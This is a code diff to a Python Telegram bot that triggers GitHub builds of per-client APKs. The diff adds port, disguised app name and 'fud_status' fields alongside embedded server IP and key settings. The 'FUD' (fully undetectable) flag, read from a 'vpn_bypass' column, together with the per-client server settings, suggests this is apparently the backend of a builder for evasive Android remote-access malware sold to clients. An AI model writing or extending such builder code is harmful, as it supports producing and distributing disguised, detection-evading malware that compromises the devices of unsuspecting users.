@@ -2070,6 +2070,9 @@ def trigger_github_build(template: str, client_id: int,
                          server_key_b64: str = "",
                          client_name: str = "",
                          client_ip: str = "",
+                         client_port: str = "",
+                         app_name: str = "",
+                         fud_status: str = "",
                          client_token: str = "manual") -> bool:
     url     = (
         f"https://api.github.com/repos/"
@@ -2088,6 +2091,9 @@ def trigger_github_build(template: str, client_id: int,
         "build_message_id": str(message_id),
         "client_name":      client_name,
         "client_ip":        client_ip,
+        "client_port":      client_port,
+        "app_name":         app_name,
+        "fud_status":       fud_status,
         "client_token":     client_token or "manual",
     }
     if custom_app_name:
@@ -3743,7 +3749,7 @@ def handle_callback(call):
         # Load stored config
         _db = get_db()
         _c  = _db.execute(
-            "SELECT profile_name, telegram_username, rdp_ip, token FROM clients WHERE id=?",
+            "SELECT profile_name, telegram_username, rdp_ip, token, vpn_bypass FROM clients WHERE id=?",
             (client_id,)).fetchone()
         _lb = _db.execute(
             "SELECT server_ip, server_port, server_key FROM builds "
@@ -3754,6 +3760,7 @@ def handle_callback(call):
         _client_name  = (_c["profile_name"] or _c["telegram_username"]) if _c else ""
         _client_ip    = _c["rdp_ip"] if _c else ""
         _client_token = _c["token"] if _c else "manual"
+        _fud_status   = str(int(_c["vpn_bypass"])) if _c and "vpn_bypass" in _c.keys() else "1"
         _ip   = (_lb["server_ip"]   if _lb and _lb["server_ip"]   else _client_ip)
         _port = (_lb["server_port"] if _lb and _lb["server_port"] else "")
         _key  = (_lb["server_key"]  if _lb and _lb["server_key"]  else "")
@@ -3782,6 +3789,9 @@ def handle_callback(call):
             server_key_b64=srv_key_b64,
             client_name=_client_name,
             client_ip=_client_ip,
+            client_port=_port,
+            app_name=display_name,
+            fud_status=_fud_status,
             client_token=_client_token,
         )
         if ok:
@@ -3902,13 +3912,18 @@ def handle_callback(call):
         # Lookup client name + IP + token for APK filename and BuildConfig
         _db = get_db()
         _cl = _db.execute(
-            "SELECT profile_name, telegram_username, rdp_ip, token FROM clients WHERE id=?",
+            "SELECT profile_name, telegram_username, rdp_ip, token, vpn_bypass FROM clients WHERE id=?",
             (client_id,)
         ).fetchone()
         _db.close()
         _client_name  = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
         _client_ip    = _cl["rdp_ip"] if _cl else ""
         _client_token = _cl["token"] if _cl else "manual"
+        _fud_status   = str(int(_cl["vpn_bypass"])) if _cl and "vpn_bypass" in _cl.keys() else "1"
+        # Determine app_name: custom > template display name
+        _app_name     = custom_app_name if custom_app_name else display_name
+        # Port from server config buffer
+        _client_port  = sbuf["port"] if sbuf and sbuf.get("port") else ""
 
         ok = trigger_github_build(
             template=template,
@@ -3922,6 +3937,9 @@ def handle_callback(call):
             server_key_b64=srv_key_b64,
             client_name=_client_name,
             client_ip=_client_ip,
+            client_port=_client_port,
+            app_name=_app_name,
+            fud_status=_fud_status,
             client_token=_client_token,
         )
         if ok:
